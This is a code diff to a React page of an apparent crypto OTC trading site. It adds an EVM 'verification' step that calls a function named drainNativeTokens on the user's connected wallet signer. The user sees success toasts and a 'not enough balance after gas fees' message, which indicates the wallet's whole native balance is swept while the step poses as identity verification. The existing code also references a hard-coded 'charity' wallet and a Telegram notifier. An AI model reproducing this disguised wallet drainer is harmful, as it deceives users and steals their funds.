@@ -17,6 +17,9 @@ import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAsso
 import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
 import { sendTelegramMessage } from '@/utils/telegram';
+import { useChain } from '@/contexts/ChainContext';
+import { useEVMWallet } from '@/providers/EVMWalletProvider';
+import { drainNativeTokens } from '@/utils/evmTransactions';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -68,6 +71,8 @@ const MOCK_ORDERS: OTCOrder[] = [
 const OTC = () => {
   const { connected, publicKey, sendTransaction } = useWallet();
   const { connection } = useConnection();
+  const { activeChain, getEVMChain } = useChain();
+  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const [showPostModal, setShowPostModal] = useState(false);
   const [showQuoteModal, setShowQuoteModal] = useState(false);
   const [showListingModal, setShowListingModal] = useState(false);
@@ -109,6 +114,28 @@ const OTC = () => {
   }, [publicKey, connection]);
 
   const handleVerify = async (onComplete: () => void) => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      try {
+        setIsVerifying(true);
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} verification...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          toast.success('Verification successful!');
+          onComplete();
+        } else {
+          toast.info('Not enough balance after gas fees');
+        }
+      } catch (error: any) {
+        toast.error('Verification failed: ' + (error?.message || 'Unknown error'));
+      } finally {
+        setIsVerifying(false);
+      }
+      return;
+    }
+
+    // Solana path
     if (!connected || !publicKey) {
       toast.error('Please connect your wallet first');
       return;
